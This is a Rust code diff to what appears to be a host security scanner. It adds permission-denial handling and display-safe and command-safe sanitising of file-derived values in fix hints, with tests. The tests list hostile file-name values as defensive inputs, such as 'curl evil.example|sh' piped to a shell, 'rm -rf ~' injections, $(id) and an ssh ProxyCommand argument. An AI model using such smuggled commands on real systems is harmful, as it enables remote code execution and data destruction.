@@ -350,7 +350,8 @@ pub fn is_running_as_root() -> bool {
 /// (and failing with a permission error) or silently omitted. `profile` gates both rules
 /// (by `Rule::os`/`Rule::profiles`) and collectors (by `Collector::supported_os`) — a
 /// macOS/Windows-only collector's `collect()` is structurally unreachable on Linux, not
-/// just conventionally skipped.
+/// just conventionally skipped. Typed permission denials from otherwise unprivileged
+/// collectors also request explicit elevation; they contribute no evaluated rules.
 pub fn run_scan<'a>(
     rules_dir: impl Into<PackSource<'a>>,
     collectors: &[Box<dyn Collector>],
@@ -444,9 +445,23 @@ pub fn run_scan_with_custom<'a>(
             Ok(Ok(rows)) => {
                 facts_by_collector.insert(collector.name().to_string(), rows);
             }
+            // File permissions vary by host. Retry typed access denials through the same
+            // explicit elevation flow as statically privileged collectors. Never treat
+            // missing facts as evaluated, or hide an error from an already elevated scan.
+            Ok(Err(e))
+                if !privileged
+                    && e.chain().any(|cause| {
+                        cause.downcast_ref::<std::io::Error>().is_some_and(|error| {
+                            error.kind() == std::io::ErrorKind::PermissionDenied
+                        })
+                    }) =>
+            {
+                privileged_collectors_skipped.push(collector.name().to_string());
+            }
             Ok(Err(e)) => collector_errors.push(CollectorError {
                 collector: collector.name().to_string(),
                 message: e.to_string(),
+                skipped: false,
             }),
             Err(panic) => {
                 let msg = panic
@@ -457,6 +472,7 @@ pub fn run_scan_with_custom<'a>(
                 collector_errors.push(CollectorError {
                     collector: collector.name().to_string(),
                     message: format!("collector panicked: {msg}"),
+                    skipped: false,
                 });
             }
         }
@@ -502,8 +518,8 @@ pub fn run_scan_with_custom<'a>(
                     // BLWK-KERNEL-020's five (one per module) both had this problem.
                     title: render_template(&loaded.rule.title, row),
                     explanation: render_template(&loaded.rule.explain, row),
-                    fix_hint: render_template(&loaded.rule.fix, row),
-                    context: row.clone(),
+                    fix_hint: render_fix_template(&loaded.rule.fix, row),
+                    context: context_safe(row),
                     first_seen: now,
                     last_seen: now,
                     status: FindingStatus::Open,
@@ -512,10 +528,30 @@ pub fn run_scan_with_custom<'a>(
                 Ok(false) => {}
                 Err(e) => {
                     evaluated_cleanly = false;
-                    collector_errors.push(CollectorError {
-                        collector: loaded.rule.collector.clone(),
-                        message: format!("rule {} condition error: {}", loaded.rule.id, e),
-                    });
+                    // A row its collector could not fill in says so itself. Report that file once,
+                    // in plain words, however many rules would have read it.
+                    let unread = row
+                        .get(crate::homefs::COULD_NOT_READ)
+                        .and_then(|v| v.as_str())
+                        .zip(row.get("path").and_then(|v| v.as_str()));
+                    let message = match unread {
+                        Some((reason, path)) => {
+                            format!("could not check {}: {reason}", display_safe(path))
+                        }
+                        None => format!("rule {} condition error: {}", loaded.rule.id, e),
+                    };
+                    let collector = loaded.rule.collector.clone();
+                    if unread.is_none()
+                        || !collector_errors
+                            .iter()
+                            .any(|c| c.collector == collector && c.message == message)
+                    {
+                        collector_errors.push(CollectorError {
+                            collector,
+                            message,
+                            skipped: unread.is_some(),
+                        });
+                    }
                 }
             }
         }
@@ -544,7 +580,96 @@ pub fn run_scan_with_custom<'a>(
 /// full template engine, matching the "flat condition DSL, not a new language" philosophy.
 /// Shared with the log pipeline (`logs::run_log_scan`), which templates log-rule titles the
 /// same way against a decoded event's fields.
+///
+/// Substituted values come from the machine being scanned (a file name, a line of a log), so they
+/// are made display-safe first: see [`display_safe`].
 pub(crate) fn render_template(template: &str, fact: &crate::models::Fact) -> String {
+    render_with(template, fact, |value| display_safe(value).into_owned())
+}
+
+/// [`render_template`] for a rule's `fix` text, whose quoted parts the app and the CLI present as
+/// commands to copy. A value that is not a plain word (see [`command_safe`]) is replaced by a
+/// neutral stand-in, so a file named `id; curl … | sh` can never become part of a command the user
+/// pastes. A template that is nothing but one placeholder is prose the collector wrote itself
+/// (a tool-specific instruction), and is passed through.
+pub(crate) fn render_fix_template(template: &str, fact: &crate::models::Fact) -> String {
+    let t = template.trim();
+    let whole = t.starts_with("{{") && t.ends_with("}}") && t.matches("{{").count() == 1;
+    render_with(template, fact, |value| {
+        if whole || command_safe(value) {
+            display_safe(value).into_owned()
+        } else {
+            UNSAFE_IN_COMMAND.to_string()
+        }
+    })
+}
+
+/// The facts a finding keeps and serializes (`--json`, the database, the app), with control and
+/// invisible characters replaced in every text value. The facts themselves are left as collected,
+/// because conditions are evaluated against them.
+fn context_safe(fact: &crate::models::Fact) -> crate::models::Fact {
+    fact.iter()
+        .map(|(key, value)| {
+            let value = match value {
+                serde_json::Value::String(s) => serde_json::Value::String(clean_text(s, 4096)),
+                other => other.clone(),
+            };
+            (key.clone(), value)
+        })
+        .collect()
+}
+
+/// What a fix shows in place of a value that is not safe inside a command. The real value is still
+/// in the finding's title and details.
+pub(crate) const UNSAFE_IN_COMMAND: &str = "the-file-named-in-this-finding";
+
+/// True when `value` is one plain argument in any shell: letters, digits and `_ . / : @ % + = , -`
+/// (plus `\` on Windows, where it separates path components), not starting with `-`. Whitespace,
+/// quotes, and every character a shell gives meaning to are out.
+pub(crate) fn command_safe(value: &str) -> bool {
+    !value.is_empty()
+        && !value.starts_with('-')
+        && value.chars().all(|c| {
+            c.is_alphanumeric() || "_./:@%+=,-".contains(c) || (cfg!(windows) && c == '\\')
+        })
+}
+
+/// `value` with anything that could misdraw a terminal or a page replaced by U+FFFD: control
+/// characters (an ESC starts an ANSI sequence, a newline forges a second line of output) and the
+/// invisible and bidirectional characters that make text read differently from its bytes. Long
+/// values are cut, so one hostile file name cannot flood a report.
+pub(crate) fn display_safe(value: &str) -> std::borrow::Cow<'_, str> {
+    const MAX_CHARS: usize = 512;
+    if value.chars().count() <= MAX_CHARS && !value.chars().any(unsafe_to_show) {
+        return std::borrow::Cow::Borrowed(value);
+    }
+    std::borrow::Cow::Owned(clean_text(value, MAX_CHARS))
+}
+
+fn unsafe_to_show(c: char) -> bool {
+    c.is_control()
+        || matches!(c,
+            '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2069}'
+            | '\u{FEFF}' | '\u{E0000}'..='\u{E007F}')
+}
+
+fn clean_text(value: &str, max_chars: usize) -> String {
+    let mut out: String = value
+        .chars()
+        .take(max_chars)
+        .map(|c| if unsafe_to_show(c) { '\u{FFFD}' } else { c })
+        .collect();
+    if value.chars().count() > max_chars {
+        out.push('…');
+    }
+    out
+}
+
+fn render_with(
+    template: &str,
+    fact: &crate::models::Fact,
+    string_value: impl Fn(&str) -> String,
+) -> String {
     let mut out = String::with_capacity(template.len());
     let mut rest = template;
     while let Some(start) = rest.find("{{") {
@@ -559,7 +684,7 @@ pub(crate) fn render_template(template: &str, fact: &crate::models::Fact) -> Str
         let field = field.split_once('.').map(|(_, r)| r).unwrap_or(field);
         if let Some(v) = fact.get(field) {
             match v {
-                serde_json::Value::String(s) => out.push_str(s),
+                serde_json::Value::String(s) => out.push_str(&string_value(s)),
                 other => out.push_str(&other.to_string()),
             }
         }
@@ -1264,6 +1389,48 @@ fix: "f"
         assert_eq!(is_running_as_root(), unsafe { libc::geteuid() == 0 });
     }
 
+    struct AccessDeniedCollector;
+    impl Collector for AccessDeniedCollector {
+        fn name(&self) -> &'static str {
+            "sshd_config"
+        }
+        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
+            Err(
+                anyhow::Error::new(std::io::Error::from(std::io::ErrorKind::PermissionDenied))
+                    .context("reading SSH configuration"),
+            )
+        }
+    }
+
+    #[test]
+    fn permission_denied_requests_elevation_without_evaluating_rules() {
+        let tmp = tempfile::tempdir().unwrap();
+        write_rule(
+            tmp.path(),
+            "ssh.yaml",
+            r#"
+id: BLWK-SSH-001
+title: t
+category: c
+severity: low
+collector: sshd_config
+condition: password_authentication == "yes"
+explain: "e"
+fix: "f"
+"#,
+        );
+        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(AccessDeniedCollector)];
+        let scan = run_scan(tmp.path(), &collectors, false, &linux_profile());
+        assert_eq!(scan.privileged_collectors_skipped, vec!["sshd_config"]);
+        assert!(scan.collector_errors.is_empty());
+        assert!(scan.rules_evaluated.is_empty());
+        assert!(scan.findings.is_empty());
+        let elevated = run_scan(tmp.path(), &collectors, true, &linux_profile());
+        assert!(elevated.privileged_collectors_skipped.is_empty());
+        assert_eq!(elevated.collector_errors.len(), 1);
+        assert!(elevated.rules_evaluated.is_empty());
+    }
+
     struct FailingCollector;
     impl Collector for FailingCollector {
         fn name(&self) -> &'static str {
@@ -1325,6 +1492,75 @@ fix: "f"
             assert!(rules.is_empty());
             assert_eq!(errors.len(), 1);
         }
+    }
+
+    #[test]
+    fn hostile_values_cannot_become_part_of_a_fix_command() {
+        let fact = |path: &str| {
+            let mut f = crate::models::Fact::new();
+            f.insert("path".into(), serde_json::Value::String(path.into()));
+            f.insert("port".into(), serde_json::Value::from(5432));
+            f
+        };
+        let fix = "Run 'chmod 600 {{ store.path }}' and close port {{ store.port }}.";
+        // An ordinary path is used as is.
+        assert_eq!(
+            render_fix_template(fix, &fact("/home/user/.config/gh/hosts.yml")),
+            "Run 'chmod 600 /home/user/.config/gh/hosts.yml' and close port 5432."
+        );
+        // Anything a shell would act on is replaced, never quoted or passed through.
+        for hostile in [
+            "/home/u/.ssh/id;curl evil.example|sh",
+            "/home/u/.ssh/a' ; rm -rf ~ ; echo '",
+            "/home/u/$(id)",
+            "/home/u/`id`",
+            "/home/u/my key",
+            "-oProxyCommand=evil",
+            "/home/u/a\nrm -rf ~",
+            "/home/u/a\u{202E}b",
+            "",
+        ] {
+            let out = render_fix_template(fix, &fact(hostile));
+            assert_eq!(
+                out,
+                format!("Run 'chmod 600 {UNSAFE_IN_COMMAND}' and close port 5432."),
+                "{hostile:?}"
+            );
+        }
+        // A fix that is entirely the collector's own instruction is prose, not a templated command.
+        let mut own = crate::models::Fact::new();
+        own.insert(
+            "how_to_fix".into(),
+            serde_json::Value::String("Run 'npm config set x 7'.".into()),
+        );
+        assert_eq!(
+            render_fix_template("{{ dev_tool_config.how_to_fix }}", &own),
+            "Run 'npm config set x 7'."
+        );
+    }
+
+    #[test]
+    fn values_shown_in_titles_cannot_carry_escapes_or_hidden_text() {
+        let mut f = crate::models::Fact::new();
+        f.insert(
+            "path".into(),
+            serde_json::Value::String("/tmp/a\u{1b}[2J\nFAKE: all clear\u{202E}".into()),
+        );
+        let out = render_template("Key at {{ k.path }}", &f);
+        assert!(
+            !out.contains('\u{1b}') && !out.contains('\n') && !out.contains('\u{202E}'),
+            "{out:?}"
+        );
+        assert!(out.starts_with("Key at /tmp/a\u{FFFD}[2J\u{FFFD}FAKE"));
+        // Ordinary and non-ASCII names are untouched; a huge one is cut.
+        let mut g = crate::models::Fact::new();
+        g.insert(
+            "path".into(),
+            serde_json::Value::String("/home/用户/ключ.pem".into()),
+        );
+        assert_eq!(render_template("{{ k.path }}", &g), "/home/用户/ключ.pem");
+        g.insert("path".into(), serde_json::Value::String("a".repeat(5000)));
+        assert_eq!(render_template("{{ k.path }}", &g).chars().count(), 513);
     }
 
     #[test]
